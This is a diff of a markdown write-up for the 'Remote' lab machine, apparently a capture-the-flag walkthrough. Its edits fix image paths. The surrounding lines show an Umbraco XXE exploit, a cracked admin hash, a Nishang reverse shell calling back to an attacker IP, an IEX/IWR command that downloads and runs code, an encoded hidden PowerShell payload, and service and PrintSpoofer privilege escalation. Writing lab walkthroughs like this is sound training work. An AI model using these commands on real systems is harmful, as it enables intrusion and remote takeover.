@@ -123,10 +123,10 @@ drwx------ nobody nobody 4.0 KB Thu Feb 20 19:16:47 2020 Views
 It looks like Web-Sites config or backup (based on the naming). **Key Finding**: Umbraco CMS
 
 Visiting port 80:
-![](<../assets/img/RemotePasted image 20260801221929.png>)
+![](<../assets/img/Remote/Pasted image 20260801221929.png>)
 
 Dummy website, but it gives is 5 names, which could be used in the potential brute-force attack
-![](<../assets/img/RemotePasted image 20260801222007.png>)
+![](<../assets/img/Remote/Pasted image 20260801222007.png>)
 
 Discovering / Fuzzing Umbraco CMS
 ```bash
@@ -171,16 +171,13 @@ umbraco                 [Status: 200, Size: 4040, Words: 710, Lines: 96, Duratio
 :: Progress: [4751/4751] :: Job [1/1] :: 141 req/sec :: Duration: [0:00:54] :: Errors: 1 ::
 ```
 We found a login page!
-![](<../assets/img/RemotePasted image 20260801222051.png>)
+![](<../assets/img/Remote/Pasted image 20260801222051.png>)
 
 **Findings:**  
 **OS:** Windows 10 / Server 2019 Build 17763 x64
 **Hostname:** REMOTE
 **Web-Site's config (backup)** (NFS Share)
 **CMS running** - Umbraco CMS - People (staff) - Login Page
-
-
-
 
 ---
 # Foothold
@@ -212,17 +209,17 @@ Hash is simply cracked using the hashcat and the wordlist `rockyou.txt`
 hashcat -m 100 adminhash --show                                        
 b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
 ```
-![](<../assets/img/RemotePasted image 20260801224115.png>)
+![](<../assets/img/Remote/Pasted image 20260801224115.png>)
 
-![](<../assets/img/RemotePasted image 20260801224131.png>)
+![](<../assets/img/Remote/Pasted image 20260801224131.png>)
 
-![](<../assets/img/RemotePasted image 20260801224226.png>)
+![](<../assets/img/Remote/Pasted image 20260801224226.png>)
 
-![](<../assets/img/RemotePasted image 20260801224348.png>)
+![](<../assets/img/Remote/Pasted image 20260801224348.png>)
 Admin Dashboard gives only another credentials and ability to change password. Nonetheless, `ssmith` doesn't brings us any new features or details.
 
 **BUT!** It also gives us file upload page, which could be used for uploading any malicious payload.
-![](<../assets/img/RemotePasted image 20260803184949.png>)
+![](<../assets/img/Remote/Pasted image 20260803184949.png>)
 
 Trying to find the CVE:
 ```bash
@@ -251,7 +248,7 @@ Before gaining the shell, we need to figure out: how does exploit works?
 Simply: It is **XXE vulnerability,** which gives us a **Remote Code Execution - RCE**. We can modify parameters :`{ string cmd = "<command"...` for inserting the command and `proc.StartInfo.Filename = "<application.exe>"`.
 
 Let's try to ping ourselves using `/c ping <our ip>` before setting up the `tcpdump` with `icmp` filter 
-![](<../assets/img/RemotePasted image 20260801231029.png>)
+![](<../assets/img/Remote/Pasted image 20260801231029.png>)
 
 Launching the exploit:
 ```python
@@ -269,7 +266,7 @@ tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 #### Break down - Reverse Shell
 `tcpdump` receives the ICMP packets, which means: it tries to communicate with the our (attacker's) machine. In other words: We can deploy Reverse Shell for infiltration. 
 
-![](<../assets/img/RemotePasted image 20260803191844.png>)
+![](<../assets/img/Remote/Pasted image 20260803191844.png>)
 A reverse shell is a type of remote shell where an **attacker exploits a known vulnerability to insert a payload** (instructions) into the target system (e.g., forcing the target to connect back to the attacker). As the **target parses and processes the payload, it initiates a connection back to the attacker’s machine** on a specified port, allowing the attacker to execute commands remotely. It is commonly used because firewalls and NAT devices often block incoming connections but allow outgoing connections.
 
 ---
@@ -386,7 +383,7 @@ function Invoke-PowerShellTcp
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.240 -Port 4444   # Editted part
 ```
 Before executing we also edit our exploit
-![](<../assets/img/RemotePasted image 20260803195039.png>)
+![](<../assets/img/Remote/Pasted image 20260803195039.png>)
 `{ string cmd = "IEX (IWR http://<ip of a web server>:<port>/<nishangshell.ps1 -UseBasicParing)"` downloads file (reverse shell) from our own web-server
 	 **IWR** (Invoke-WebRequest) - reaches out to the specified URL and downloads the raw text content of the script 
 	  **IEX** (Invoke-Expression) - takes downloaded scripts and executes it directly from the memory (shell triggering) 
@@ -453,7 +450,7 @@ powershell.exe -nop -w hidden -e -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjA
 ```
 From this point we need to edit our exploit, paste the string above and ultimately - receive the connection.
 
-![](<../assets/img/RemotePasted image 20260803201031.png>)
+![](<../assets/img/Remote/Pasted image 20260803201031.png>)
 
 ```python
 python3 46153.py                                                      
@@ -653,7 +650,7 @@ Afterward - just launch it
 ./winpeas.exe
 ```
 It gives us overwhelming amount of information, but while scrolling down we can see this:
-![](<../assets/img/RemotePasted image 20260802121734.png>)
+![](<../assets/img/Remote/Pasted image 20260802121734.png>)
 
 `UsoSvc` can be altered! Which means we can modify the path to its binary, inserting our payload (from `Metasploit` or from `Nishang `- never mind ). But firstly - we must determine, which one built-in account is running the service?
 ```powershell
@@ -921,7 +918,7 @@ For all comprehensive suite of information is provided in this article (created 
 PrintSpoofer GitHub Repository - https://github.com/itm4n/PrintSpoofer
 
 For building an exploit we should enter in Microsoft Visual Studio, open solution file `.sln` and press `Ctrl + Shift + B` for building the executable file.
-![](<../assets/img/RemotePasted image 20260804130049.png>)
+![](<../assets/img/Remote/Pasted image 20260804130049.png>)
 **NOTE!:** For avoiding any errors, you need to set **`Code Generation`** `(Top Menu: Project -> Properties`) to **`Multi-threaded (/MT)`**
 
 Retrieving file:
